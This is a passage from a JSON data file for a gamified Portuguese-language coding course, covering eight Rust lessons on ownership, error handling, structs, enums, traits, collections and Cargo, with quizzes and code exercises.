    "level": "Avançado",
    "totalXp": 525,
    "lessons": [
      {
        "id": "rust-1",
        "title": "1. O Reinado do Ownership & Borrowing",
        "description": "Domine a gestão de memória segura sem garbage collector e as regras de empréstimo do Rust.",
        "duration": 16,
        "xpReward": 65,
        "language": "rust",
        "content": "# 🦀 O Reinado do Ownership & Borrowing na Cidadela de Ferro\n\nBem-vindo à **Cidadela de Ferro**, cadete! No universo dos sistemas críticos — de motores de foguetes a navegadores de alta performance — vazamentos de memória ou ponteiros soltos causam destruição total.\n\nO **Rust**, eleito a linguagem mais amada pelos desenvolvedores por quase uma década, resolveu o maior dilema da computação: **como ter a velocidade do C++ com 100% de segurança de memória?** A resposta é o **Ownership** (Posse).\n\n---\n\n### 🛡️ As Três Leis Sagradas do Ownership\n\n1. Cada valor em Rust tem um único dono (uma variável).\n2. Só pode haver um único dono por vez.\n3. Quando o dono sai do escopo (`}`), o valor é destruído e a memória é liberada automaticamente através da função `drop`.\n\n```rust\n{\n    let msg = String::from(\"Sinal de Dobra\"); // msg é dona da string\n    // usamos msg aqui...\n} // Aqui o escopo fecha e msg é liberada da memória imediatamente!\n```\n\n---\n\n### 🤝 Empréstimos (Borrowing): Referências Imutáveis e Mutáveis\n\nEm vez de transferir a posse definitiva de um dado toda vez que chamamos uma função (o que chamamos de *Move*), nós **emprestamos** o valor usando referências:\n\n- **Referência Imutável (`&T`):** Permite leitura sem transferir posse. Você pode ter infinitas referências imutáveis ao mesmo tempo:\n  ```rust\n  fn calcular_tamanho(texto: &String) -> usize {\n      texto.len()\n  }\n  ```\n- **Referência Mutável (`&mut T`):** Permite alterar o valor emprestado. Regra de ouro: **só pode haver uma única referência mutável por vez** para evitar corridas de dados (*data races*)!\n\n> **💡 Dica Pro:**\n> Por padrão, todas as variáveis em Rust são **imutáveis**. Se você planeja alterar o valor de uma variável ao longo do tempo, declare-a explicitamente com `let mut valor = 10;`.\n\n> **⚠️ Armadilha Comum:**\n> Tentar acessar uma variável após ela ter sido movida para outra função gera o erro `use of moved value`. Para manter o acesso, passe uma referência usando o `&` na frente!",
        "codeExample": "// Demonstração de Empréstimo Seguro em Rust\nfn main() {\n    let mut blindagem = 100;\n    \n    // Passando referência mutável para reparar o escudo\n    reparar_escudo(&mut blindagem);\n    println!(\"Nível da blindagem reparada: {}%\", blindagem);\n}\n\nfn reparar_escudo(nivel: &mut i32) {\n    *nivel += 25;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual das alternativas descreve corretamente a regra do Borrow Checker do Rust sobre referências concorrentes?",
            "options": [
              "Você pode ter quantas referências mutáveis quiser ao mesmo tempo sem restrições.",
              "Você pode ter múltiplas referências imutáveis (&) OU exatamente uma única referência mutável (&mut) por vez, prevenindo corridas de dados.",
              "Referências em Rust exigem a instalação de um Garbage Collector no servidor.",
              "Empréstimos de memória são proibidos em funções públicas."
            ],
            "correctIndex": 1,
            "explanation": "Essa regra matemática impede corridas de dados (data races) em tempo de compilação: enquanto alguém altera o dado com &mut, ninguém mais pode ler ou escrever nele simultaneamente."
          },
          {
            "type": "fillblank",
            "title": "Assinando o Empréstimo Imutável",
            "instruction": "Complete a função para receber uma referência de leitura de uma String sem tomar posse definitiva dela.",
            "codeSnippet": "fn inspecionar_modulo(nome: {{simbolo_referencia}}String) {\n    println!(\"Inspecionando módulo: {}\", nome);\n}",
            "blanks": [
              {
                "id": "simbolo_referencia",
                "placeholder": "símbolo de referência",
                "expectedValues": [
                  "&"
                ],
                "hint": "Caractere único (\"e comercial\") que cria uma referência de empréstimo em Rust."
              }
            ],
            "explanation": "Perfeito! O símbolo & empresta o valor sem tomar posse, permitindo que a variável original continue utilizável após a função."
          },
          {
            "type": "bughunt",
            "title": "Mutabilidade Não Declarada",
            "scenario": "O compilador rustc emitiu o erro \"cannot mutate immutable variable `escudos`\" na Cidadela de Ferro.",
            "buggyCode": "fn main() {\n    let escudos = 80;\n    escudos = escudos + 20;\n    println!(\"Escudos: {}\", escudos);\n}",
            "expectedKeywords": [
              "let mut escudos = 80;"
            ],
            "forbiddenKeywords": [
              "let escudos = 80;"
            ],
            "hint": "Variáveis em Rust são imutáveis por padrão. Adicione a palavra-chave mut logo após let.",
            "solutionExplanation": "Excelente depuração! Com let mut escudos = 80;, a variável ganha autorização para reatribuição."
          }
        ]
      },
      {
        "id": "rust-2",
        "title": "2. Robustez Sem Null: Option, Result & Pattern Matching",
        "description": "Elimine exceções não tratadas com os enums Option e Result e desempacotamento exaustivo com match.",
        "duration": 17,
        "xpReward": 65,
        "language": "rust",
        "content": "# 🛡️ Robustez Sem Null: Option, Result & Pattern Matching\n\nSir Tony Hoare, criador da referência nula em 1965, chamou publicamente a invenção do `null` de seu **\"erro de um bilhão de dólares\"** devido à quantidade incontável de falhas e vulnerabilidades que ela causou na história do software.\n\nO Rust tomou uma decisão radical: **o valor `null` simplesmente não existe em Rust**!\n\n---\n\n### 📦 O Enum `Option<T>`: Presença ou Ausência\n\nQuando um dado pode ou não existir (por exemplo, buscar um usuário por ID no banco), Rust usa o enum nativo:\n\n```rust\nenum Option<T> {\n    Some(T), // Contém o valor existente\n    None,    // Ausência do valor\n}\n```\n\n---\n\n### ⚠️ O Enum `Result<T, E>`: Sucesso ou Falha\n\nPara operações que podem falhar (leitura de arquivos, rede, conversões numéricas):\n\n```rust\nenum Result<T, E> {\n    Ok(T),  // Operação concluída com sucesso\n    Err(E), // Falhou com um erro tipado\n}\n```\n\n---\n\n### 🎯 Desempacotamento Exaustivo com `match`\n\nO compilador exige que você cubra **todos os cenários possíveis**. É impossível esquecer de tratar um erro:\n\n```rust\nfn disparar_sensor(status: Option<i32>) {\n    match status {\n        Some(potencia) => println!(\"Sensor calibrado em {}%\", potencia),\n        None => println!(\"Sensor desconectado!\"),\n    }\n}\n```\n\n> **💡 Dica Pro:**\n> Quando quiser apenas propagar um erro para quem chamou a função de forma enxuta, use o operador de interrogação `?`: `let arquivo = File::open(\"log.txt\")?;`.\n\n> **⚠️ Armadilha Comum:**\n> Usar o método `.unwrap()` sem cuidado força a extração do valor e trava o programa com um *panic* se o resultado for `None` ou `Err`. Em produção, prefira sempre `match` ou `if let`.",
        "codeExample": "// Leitura e Tratamento Exaustivo em Rust\nfn ler_frequencia(canal: i32) -> Result<f64, String> {\n    if canal > 0 && canal <= 100 {\n        Ok(1420.405) // Frequência do hidrogênio interestelar\n    } else {\n        Err(String::from(\"Canal fora do espectro detectável.\"))\n    }\n}\n\nfn main() {\n    match ler_frequencia(42) {\n        Ok(freq) => println!(\"Frequência captada: {} MHz\", freq),\n        Err(erro) => println!(\"Falha de sintonia: {}\", erro),\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o enum padrão da linguagem Rust utilizado para representar operações que podem ser bem-sucedidas (Ok) ou falhar com um erro (Err)?",
            "options": [
              "TryCatch<T>",
              "Result<T, E>",
              "Nullable<T>",
              "ExceptionBlock<E>"
            ],
            "correctIndex": 1,
            "explanation": "Result<T, E> é o enum soberano de tratamento de erros em Rust, encapsulando Ok(valor) ou Err(erro) sem necessidade de exceções em tempo de execução."
          },
          {
            "type": "code",
            "instruction": "Escreva uma estrutura match para a variável opcao (do tipo Option<i32>) que retorne o valor val no braço Some(val) e 0 no braço None.",
            "initialCode": "// Considere que a variável \"opcao\" já existe\n// Complete o match abaixo\nmatch opcao {\n",
            "expectedKeywords": [
              "match opcao",
              "Some(val) => val",
              "None => 0"
            ],
            "hint": "Escreva: match opcao { Some(val) => val, None => 0 }.",
            "solution": "match opcao {\n    Some(val) => val,\n    None => 0,\n}"
          }
        ]
      },
      {
        "id": "rust-3",
        "title": "3. Structs e Métodos Associados com impl",
        "description": "Modele dados robustos com structs, campos nomeados, blocos impl e construtores associados new().",
        "duration": 16,
        "xpReward": 65,
        "language": "rust",
        "content": "# 🦀 Structs e Métodos Associados com impl\n\nFortificações da Cidadela de Ferro! Em Rust, não existem classes nem herança tradicional de orientação a objetos. Em vez disso, combinamos **Structs** para definir a anatomia dos dados e blocos **`impl`** para definir comportamentos.\n\n> **💡 O que é uma Struct em Rust?**\n> Uma `struct` agrupa múltiplos valores relacionados sob um mesmo tipo de dados fortemente tipado. A integridade da memória e das propriedades é checada com rigor milimétrico pelo compilador.\n\n---\n\n### 🏗️ Definindo a Struct e o Bloco `impl`\n\n```rust\n// 1. Definição dos dados\npub struct Nave {\n    pub modelo: String,\n    escudo: u32,       // Campo privado!\n    combustivel: u32,\n}\n\n// 2. Implementação dos métodos\nimpl Nave {\n    // Função associada (construtor idiomático)\n    pub fn new(modelo: &str) -> Self {\n        Nave {\n            modelo: modelo.to_string(),\n            escudo: 100,\n            combustivel: 1000,\n        }\n    }\n\n    // Método que lê dados (&self emprestado)\n    pub fn exibir_status(&self) {\n        println!(\"Nave: {} | Escudos: {}%\", self.modelo, self.escudo);\n    }\n\n    // Método que modifica dados (&mut self emprestado mutável)\n    pub fn sofrer_dano(&mut self, dano: u32) {\n        self.escudo = self.escudo.saturating_sub(dano);\n    }\n}\n```\n\n---\n\n### 🛡️ As Formas de `self` nos Métodos\n\n- **`&self`**: Empréstimo somente leitura. Permite ler atributos sem consumir o objeto.\n- **`&mut self`**: Empréstimo mutável exclusivo. Permite alterar os atributos do objeto.\n- **`self`**: Assume o *Ownership* total! O objeto é consumido e destruído ao final do método (útil em transformações irreversíveis).\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a palavra-chave `mut` na variável que instancia a struct ao chamar métodos com `&mut self`: `let mut nave = Nave::new(\"Orion\");`. O Rust impede qualquer mutação em variáveis declaradas como imutáveis!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use a macro `#[derive(Debug)]` acima da struct para permitir a impressão de depuração formatada com `println!(\"{:?}\", objeto)`.\n- Mantenha campos internos sensíveis como privados e forneça métodos de acesso controlados (*Getters*).\n\n> **🛡️ Regra de Ouro:**\n> Separe dados de comportamentos: Structs guardam estado, blocos `impl` operam sobre ele.",
        "codeExample": "#[derive(Debug)]\npub struct Coordenada {\n    pub x: f64,\n    pub y: f64,\n}\n\nimpl Coordenada {\n    pub fn origem() -> Self {\n        Coordenada { x: 0.0, y: 0.0 }\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em um bloco impl em Rust, qual forma do parâmetro self deve ser declarada em um método que precisa alterar as variáveis internas da struct?",
            "options": [
              "&self",
              "&mut self",
              "mut self: Type",
              "static self"
            ],
            "correctIndex": 1,
            "explanation": "&mut self solicita um empréstimo exclusivo mutável da instância, autorizando a alteração de seus campos."
          },
          {
            "type": "code",
            "instruction": "Escreva a assinatura de uma função associada chamada \"new\" dentro de um bloco impl que receba \"id: u32\" e retorne \"Self\".",
            "initialCode": "// Escreva a assinatura da função associada new aqui\n",
            "expectedKeywords": [
              "pub fn new(id: u32) -> Self"
            ],
            "hint": "Use: pub fn new(id: u32) -> Self",
            "solution": "pub fn new(id: u32) -> Self"
          }
        ]
      },
      {
        "id": "rust-4",
        "title": "4. Enums Ricos com Dados e Controle com match",
        "description": "Modele máquinas de estado completas anexando dados às variantes de enums e use match exaustivo.",
        "duration": 16,
        "xpReward": 65,
        "language": "rust",
        "content": "# 💠 Enums Ricos com Dados e Controle com match\n\nEstruturas quânticas na Cidadela de Ferro! Em muitas linguagens, enums são apenas listas de inteiros numerados. Em Rust, os **Enums são tipos de dados algébricos (ADT)** capazes de carregar payloads de dados ricos dentro de cada variante!\n\n> **💡 Enums com Dados Anexados**\n> Cada variante de um enum em Rust pode armazenar tipos diferentes de informações (tuplas, structs inteiras ou tipos primitivos).\n\n---\n\n### 🛰️ Definindo um Enum com Múltiplos Formatos\n\n```rust\npub enum ComandoNave {\n    Decolar,                                // Sem dados\n    MudarVelocidade(u32),                   // Carrega um inteiro\n    MoverPara { x: i32, y: i32 },           // Carrega campos nomeados\n    TransmitirMensagem(String),             // Carrega uma String\n}\n```\n\n---\n\n### 🎯 O Poder Exaustivo do `match`\n\nO compilador do Rust **obriga você a cobrir 100% de todos os cenários possíveis**. Se você esquecer uma única variante, o código não compila!\n\n```rust\nfn processar_comando(comando: ComandoNave) {\n    match comando {\n        ComandoNave::Decolar => {\n            println!(\"Iniciando ignição dos propulsores!\");\n        }\n        ComandoNave::MudarVelocidade(velocidade) => {\n            println!(\"Velocidade ajustada para: {} nós\", velocidade);\n        }\n        ComandoNave::MoverPara { x, y } => {\n            println!(\"Trajetória recalibrada para coordenadas ({}, {})\", x, y);\n        }\n        ComandoNave::TransmitirMensagem(msg) => {\n            println!(\"Enviando sinal estelar: {}\", msg);\n        }\n    }\n}\n```\n\nSe quiser tratar apenas uma variante específica e ignorar as outras, use a concisa instrução `if let`:\n```rust\nif let ComandoNave::MudarVelocidade(v) = comando {\n    println!(\"Velocidade detectada: {}\", v);\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar o coringa `_ => ...` no `match` por preguiça quando novas variantes ainda estão sendo adicionadas ao sistema. Sem o coringa, o compilador te avisa automaticamente em todos os lugares do projeto onde o novo caso precisa ser tratado!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use enums para modelar máquinas de estado (ex: `Conectando`, `Conectado(Token)`, `Desconectado { motivo: String }`).\n- Combine enums com `match` para eliminar completamente a necessidade de valores nulos ou variáveis booleanas soltas.\n\n> **🛡️ Regra de Ouro:**\n> O compilador do Rust é o seu copiloto: o `match` exaustivo garante que nenhum caso de erro passe despercebido.",
        "codeExample": "#[derive(Debug)]\npub enum StatusMissao {\n    Ativa,\n    Sucesso(u32), // Carrega os pontos de XP ganhos\n    Falha(String), // Carrega a mensagem de erro\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que o compilador do Rust faz caso uma expressão \"match\" não trate todas as possíveis variantes de um enum?",
            "options": [
              "Ele insere um valor null silenciosamente em tempo de execução.",
              "Ele emite um erro de compilação exigindo cobertura exaustiva de todas as variantes.",
              "Ele ignora a instrução e pula para o próximo método.",
              "Ele reinicia o processo da máquina virtual."
            ],
            "correctIndex": 1,
            "explanation": "O pattern matching em Rust é exaustivo: o compilador recusa a construção do binário se qualquer variante do enum for omitida."
          },
          {
            "type": "code",
            "instruction": "Escreva a declaração de um enum chamado \"Alerta\" com duas variantes: Verde (sem parâmetros) e Vermelho(u8).",
            "initialCode": "// Crie o enum Alerta aqui\n",
            "expectedKeywords": [
              "enum Alerta {",
              "Verde,",
              "Vermelho(u8),",
              "}"
            ],
            "hint": "Use: enum Alerta {\n    Verde,\n    Vermelho(u8),\n}",
            "solution": "enum Alerta {\n    Verde,\n    Vermelho(u8),\n}"
          }
        ]
      },
      {
        "id": "rust-5",
        "title": "5. Traits e Polimorfismo Seguro em Tempo de Compilação",
        "description": "Defina comportamentos compartilhados com traits e use trait bounds genericos com zero overhead em runtime.",
        "duration": 17,
        "xpReward": 65,
        "language": "rust",
        "content": "# 🛡️ Traits e Polimorfismo Seguro em Tempo de Compilação\n\nEngenharia de precisão na Cidadela de Ferro! O Rust implementa polimorfismo através de **Traits** (semelhantes a interfaces de outras linguagens, mas com despacho estático por monomorfização sem perda de performance em tempo de execução).\n\n> **💡 O que é uma Trait?**\n> Uma `trait` descreve um conjunto de métodos que um tipo precisa implementar para fornecer um determinado comportamento compartilhado.\n\n---\n\n### ✍️ Definindo e Implementando uma Trait\n\n```rust\npub trait EmissorDeSinal {\n    // Assinatura obrigatória\n    fn emitir(&self) -> String;\n\n    // Método com implementação padrão opcional:\n    fn frequencia(&self) -> f64 {\n        1420.4 // Frequência do hidrogênio interestelar padrão\n    }\n}\n\npub struct RadioEspacial {\n    pub codigo: String,\n}\n\nimpl EmissorDeSinal for RadioEspacial {\n    fn emitir(&self) -> String {\n        format!(\"Sinal de rádio disparado do terminal: {}\", self.codigo)\n    }\n}\n```\n\n---\n\n### 🎯 Usando Trait Bounds em Funções Genéricas\n\nExija que um parâmetro genérico implemente uma Trait específica:\n\n```rust\n// Sintaxe elegante com impl Trait:\npub fn transmitir(dispositivo: &impl EmissorDeSinal) {\n    println!(\"Transmitindo: {}\", dispositivo.emitir());\n}\n\n// Ou com sintaxe completa de Trait Bounds:\npub fn transmitir_generico<T: EmissorDeSinal>(dispositivo: &T) {\n    println!(\"Frequência: {} MHz\", dispositivo.frequencia());\n}\n```\n\n- **Monomorfização:** Em tempo de compilação, o compilador do Rust gera cópias especializadas de código nativo para cada tipo concreto que usa a função. O custo em tempo de execução é **ZERO** (*Zero-Cost Abstractions*)!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de colocar a Trait no escopo (`use meu_modulo::EmissorDeSinal;`) no arquivo onde você quer chamar os métodos da trait. Em Rust, você só pode usar métodos de uma trait se a trait estiver importada no módulo atual!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Implemente traits fundamentais da biblioteca padrão do Rust nos seus tipos sempre que fizer sentido: `Display`, `Clone`, `PartialEq`.\n- Use a cláusula `where` quando tiver múltiplos limites de traits longos para manter as assinaturas de funções legíveis.\n\n> **🛡️ Regra de Ouro:**\n> Traits permitem criar sistemas modulares altamente extensíveis sem abrir mão da segurança estrita de tipos e da velocidade máxima do código nativo.",
        "codeExample": "pub trait Descrevivel {\n    fn descrever(&self) -> String;\n}\n\npub fn exibir_resumo(item: &impl Descrevivel) {\n    println!(\"Resumo: {}\", item.descrever());\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Como o compilador do Rust garante que o uso de Traits genéricas (como fn test<T: Trait>) tenha \"Zero-Cost Abstraction\" (custo zero de performance)?",
            "options": [
              "Ele converte o código Rust para JavaScript em tempo de execução.",
              "Através de monomorfização em tempo de compilação, gerando código de máquina especializado e direto para cada tipo concreto que invoca a função.",
              "Removendo todas as verificações de tipos.",
              "Usando um garbage collector de alto desempenho em segundo plano."
            ],
            "correctIndex": 1,
            "explanation": "A monomorfização duplica e otimiza o código compilado para cada tipo estático, eliminando chamadas virtuais indiretas em runtime."
          },
          {
            "type": "code",
            "instruction": "Escreva a declaração de uma trait pública chamada \"Energizavel\" com a assinatura de um método \"fn nivel_energia(&self) -> u32;\".",
            "initialCode": "// Declare a trait Energizavel aqui\n",
            "expectedKeywords": [
              "pub trait Energizavel {",
              "fn nivel_energia(&self) -> u32;",
              "}"
            ],
            "hint": "Use: pub trait Energizavel {\n    fn nivel_energia(&self) -> u32;\n}",
            "solution": "pub trait Energizavel {\n    fn nivel_energia(&self) -> u32;\n}"
          }
        ]
      },
      {
        "id": "rust-6",
        "title": "6. Coleções Padrão: Vec, HashMap e Strings",
        "description": "Armazene e manipule coleções alocadas na Heap com vetores elásticos Vec, tabelas hash e String vs &str.",
        "duration": 16,
        "xpReward": 65,
        "language": "rust",
        "content": "# 🗃️ Coleções Padrão: Vec, HashMap e Strings\n\nGestão de memória Heap na Cidadela de Ferro! Enquanto vetores estáticos de tamanho fixo (`[T; N]`) residem na Stack com tamanho conhecido em tempo de compilação, coleções dinâmicas de tamanho mutável crescem na memória **Heap**.\n\n> **💡 O Trio da Biblioteca Padrão (`std::collections`)**\n> 1. **`Vec<T>`**: Lista redimensionável contígua na memória.\n> 2. **`HashMap<K, V>`**: Dicionário associativo de chaves e valores.\n> 3. **`String` vs `&str`**: `String` é dona dos dados na Heap (mutável e dinâmica); `&str` é uma fatia (*slice*) emprestada somente leitura.\n\n---\n\n### 📦 Vetores Elásticos: `Vec<T>`\n\n```rust\n// Criando com a macro vec!\nlet mut planetas = vec![\"Terra Digital\", \"Neon City\", \"Cyber Core\"];\n\n// Adicionando elementos\nplanetas.push(\"Cidadela de Ferro\");\n\n// Acesso seguro com .get() (retorna Option<&T> evitando pânico!)\nif let Some(planeta) = planetas.get(1) {\n    println!(\"Destino: {}\", planeta);\n}\n```\n\n---\n\n### 🗺️ Tabelas de Dispersão com `HashMap`\n\n```rust\nuse std::collections::HashMap;\n\nlet mut estoque_misseis = HashMap::new();\n\nestoque_misseis.insert(String::from(\"Nave-Alfa\"), 12);\nestoque_misseis.insert(String::from(\"Nave-Beta\"), 4);\n\n// Atualização condicional elegante com a API entry():\nestoque_misseis.entry(String::from(\"Nave-Gama\")).or_insert(8);\n\nfor (nave, qtd) in &estoque_misseis {\n    println!(\"{}: {} projéteis restantes\", nave, qtd);\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Acessar elementos de um vetor por índice direto (`vetor[10]`). Se o índice não existir, o Rust disparará um **panic** imediato derrubando o programa! Prefira sempre o método seguro `vetor.get(indice)`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Passe referências fatiadas `&str` ou `&[T]` como parâmetros de funções em vez de `&String` ou `&Vec<T>`: isso aceita tanto dados da heap quanto fatias estáticas da stack!\n- Use `Vec::with_capacity(tamanho)` se souber previamente quantos itens o vetor receberá para evitar realocações consecutivas na heap.\n\n> **🛡️ Regra de Ouro:**\n> Respeite a propriedade: ao inserir um valor com *Ownership* em um vetor ou mapa, a coleção passa a ser a nova proprietária desse valor.",
        "codeExample": "use std::collections::HashMap;\n\nfn contar_frequencias(itens: &[&str]) -> HashMap<&str, usize> {\n    let mut mapa = HashMap::new();\n    for &item in itens {\n        *mapa.entry(item).or_insert(0) += 1;\n    }\n    mapa\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual método do Vec<T> permite acessar um elemento por índice retornando um Option<&T> seguro sem causar pânico caso o índice esteja fora dos limites?",
            "options": [
              ".fetch()",
              ".get()",
              ".read()",
              ".find()"
            ],
            "correctIndex": 1,
            "explanation": "O método .get(indice) devolve Some(&valor) se o índice existir e None caso contrário, prevenindo falhas de runtime."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código em Rust para criar um vetor mutável de números inteiros chamado \"dados\" usando a macro vec! com os valores 1, 2 e 3.",
            "initialCode": "// Crie o vetor dados aqui\n",
            "expectedKeywords": [
              "let mut dados = vec![1, 2, 3];"
            ],
            "hint": "Use: let mut dados = vec![1, 2, 3];",
            "solution": "let mut dados = vec![1, 2, 3];"
          }
        ]
      },
      {
        "id": "rust-7",
        "title": "7. Propagação de Erros Elegante com o Operador ?",
        "description": "Lide com falhas com o tipo Result<T, E> e propague erros de forma concisa e idiomática com o operador interrogação ?.",
        "duration": 16,
        "xpReward": 65,
        "language": "rust",
        "content": "# ❓ Propagação de Erros Elegante com o Operador ?\n\nManobras defensivas na Cidadela de Ferro! Em Rust, não existem exceções não checadas nem o perigo do valor nulo (`null`). Todas as funções que podem falhar retornam obrigatoriamente um **`Result<T, E>`** contendo `Ok(valor)` ou `Err(erro)`.\n\n> **💡 O Operador `?` (Question Mark Operator)**\n> É o atalho mais amado do ecossistema Rust. Colocado ao final de uma expressão que retorna `Result`, ele desembala o valor se for `Ok`, mas se for `Err`, ele **retorna o erro imediatamente** saindo da função atual!\n\n---\n\n### 🚀 Comparando com e sem o Operador `?`\n\nModo manual e verboso com `match`:\n```rust\nfn ler_arquivo_manual() -> Result<String, std::io::Error> {\n    let resultado = std::fs::read_to_string(\"log.txt\");\n    match resultado {\n        Ok(conteudo) => Ok(conteudo),\n        Err(e) => return Err(e), // Devolve o erro manualmente\n    }\n}\n```\n\nModo elegante com o operador `?`:\n```rust\nuse std::fs::File;\nuse std::io::{self, Read};\n\nfn ler_diario_bordo() -> Result<String, io::Error> {\n    // Se abrir falhar, retorna o erro. Se der certo, entrega o arquivo!\n    let mut arquivo = File::open(\"diario.txt\")?;\n    let mut conteudo = String::new();\n    \n    arquivo.read_to_string(&mut conteudo)?;\n    Ok(conteudo)\n}\n```\n\n---\n\n### 🔄 O Operador `?` Também Funciona com `Option<T>`!\n\nSe usado em funções que retornam `Option`, o `?` retorna `None` imediatamente se o valor não estiver presente.\n\n> **⚠️ Armadilha Comum:**\n> Usar o método `.unwrap()` no código de produção. O `.unwrap()` presume que a operação sempre deu certo; se houver um erro, o programa aborta com pânico imediatamente! Use `?' ou trate o `Result` adequadamente.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Em projetos maiores, utilize crates especializadas como `thiserror` (para criar tipos de erro expressivos) ou `anyhow` (para aplicações que apenas propagam erros genéricos).\n- Adicione contexto amigável aos erros antes de propagá-los.\n\n> **🛡️ Regra de Ouro:**\n> Erros recuperáveis devem sempre ser comunicados através de `Result`, preservando a resiliência do sistema operacional.",
        "codeExample": "use std::num::ParseIntError;\n\nfn multiplicar_strings(s1: &str, s2: &str) -> Result<i32, ParseIntError> {\n    let n1 = s1.parse::<i32>()?;\n    let n2 = s2.parse::<i32>()?;\n    Ok(n1 * n2)\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que o operador ? (interrogação) faz quando aplicado em uma expressão que resulta na variante Err(erro) em Rust?",
            "options": [
              "Ele converte o erro em zero e continua a execução da próxima linha.",
              "Ele interrompe a função atual imediatamente e retorna a variante Err(erro) para a função que a chamou.",
              "Ele reinicia o computador do servidor.",
              "Ele dispara um panic fatal irreversível."
            ],
            "correctIndex": 1,
            "explanation": "O operador ? faz o early return do erro capturado, propagando-o para quem chamou a função de forma transparente."
          },
          {
            "type": "code",
            "instruction": "Complete a linha de código aplicando o operador \"?\" ao ler a string com \"s.parse::<u32>()\" na constante \"numero\".",
            "initialCode": "fn converter(s: &str) -> Result<u32, std::num::ParseIntError> {\n  // Escreva a conversão aqui com o operador ?\n}",
            "expectedKeywords": [
              "let numero = s.parse::<u32>()?;",
              "Ok(numero)"
            ],
            "hint": "Use: let numero = s.parse::<u32>()?;\n    Ok(numero)",
            "solution": "fn converter(s: &str) -> Result<u32, std::num::ParseIntError> {\n    let numero = s.parse::<u32>()?;\n    Ok(numero)\n}"
          }
        ]
      },
      {
        "id": "rust-8",
        "title": "8. Módulos, Visibilidade pub e o Ecossistema Cargo",
        "description": "Estruture projetos modulares em múltiplos arquivos, gerencie visibilidade com pub e explore pacotes com Cargo.",
        "duration": 17,
        "xpReward": 70,
        "language": "rust",
        "content": "# 🏛️ Módulos, Visibilidade pub e o Ecossistema Cargo\n\nMissão de graduação na Cidadela de Ferro! Criar softwares monolíticos em um único arquivo `main.rs` é inviável em projetos de escala militar. O Rust possui um dos melhores gerenciadores de pacotes do mundo da computação: o **Cargo**.\n\n> **💡 O Sistema de Módulos do Rust**\n> - **Crate**: Uma unidade de compilação (binário executável ou biblioteca).\n> - **Module (`mod`)**: Organiza o código em namespaces hierárquicos dentro da crate.\n> - **`pub`**: Por padrão, **tudo no Rust é estritamente privado**! Use a palavra-chave `pub` para expor funções, structs e módulos externamente.\n\n---\n\n### 🌲 A Árvore de Módulos\n\nEstrutura recomendada de pastas:\n```\nsrc/\n├── main.rs\n└── navegacao/\n    ├── mod.rs (ou navegacao.rs)\n    ├── propulsao.rs\n    └── sensores.rs\n```\n\nDeclarando e usando os módulos:\n```rust\n// Em src/main.rs:\nmod navegacao; // Registra o módulo navegacao\n\nuse navegacao::propulsao::iniciar_reator; // Importa atalho\n\nfn main() {\n    iniciar_reator();\n}\n```\n\n---\n\n### 📦 O Arquivo `Cargo.toml`\n\nO manifesto do seu projeto onde você gerencia metadados e dependências externas da comunidade em [crates.io](https://crates.io):\n\n```toml\n[package]\nname = \"nexus-fortress\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nserde = { version = \"1.0\", features = [\"derive\"] }\ntokio = { version = \"1.0\", features = [\"full\"] }\n```\n\nComandos fundamentais do Cargo:\n- `cargo check`: Valida tipos e regras de ownership em alta velocidade sem gerar o binário final.\n- `cargo build --release`: Compila otimizações máximas para produção.\n- `cargo test`: Executa a suíte de testes unitários e de integração embutida.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de marcar campos de uma struct como `pub` mesmo após marcar a struct como `pub struct`. Em Rust, os campos internos da struct continuam privados a menos que você adicione `pub` explicitamente em cada um deles!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use `cargo clippy` regularmente: é o linter oficial do Rust que ensina truques idiomáticos avançados e aponta melhorias de desempenho.\n- Documente suas funções públicas com comentários de três barras (`///`). O comando `cargo doc --open` gera um website completo de documentação da sua API automaticamente!\n\n> **🛡️ Regra de Ouro:**\n> O Cargo é o coração do desenvolvimento em Rust: ele gerencia compilação, testes, documentação e dependências com reproducibilidade matemática.",
        "codeExample": "// modulo_seguranca.rs\npub mod seguranca {\n    pub fn verificar_credencial(codigo: &str) -> bool {\n        codigo == \"NEXUS-FERRO\"\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Rust, qual é a visibilidade padrão de funções, structs e variáveis declaradas dentro de um módulo?",
            "options": [
              "Pública para qualquer arquivo do sistema operacional.",
              "Privada por padrão, sendo acessível apenas dentro do próprio módulo a menos que seja prefixada com pub.",
              "Compartilhada globalmente via thread pool.",
              "Protegida por herança virtual."
            ],
            "correctIndex": 1,
            "explanation": "No modelo de segurança do Rust, tudo é privado por padrão até que seja explicitamente exposto com pub."
          },
          {
            "type": "code",
            "instruction": "Escreva a declaração de uma função pública chamada \"iniciar\" sem argumentos e sem retorno (-> ()) usando a palavra-chave pub.",
            "initialCode": "// Declare a função pública iniciar aqui\n",
            "expectedKeywords": [
              "pub fn iniciar() {",
              "}"
            ],
            "hint": "Use: pub fn iniciar() {\n}",
            "solution": "pub fn iniciar() {\n}"
          }
        ]
      }
    ]
  },
  {
    "id": "docker",
    "slug": "docker",
    "name": "Docker",
    "planetName": "Estação Orbital Docker",
    "description": "Empacote aplicações em cápsulas autônomas, imutáveis e portáteis. O fim do \"na minha máquina funciona!\".",
    "icon": "🐳",
    "color": "#2496ED",
    "language": "dockerfile",
    "level": "Intermediário",
    "totalXp": 525,
    "lessons": [
      {
        "id": "docker-1",
        "title": "1. O Fim do \"Na Minha Máquina Funciona\": Imagens & Containers",
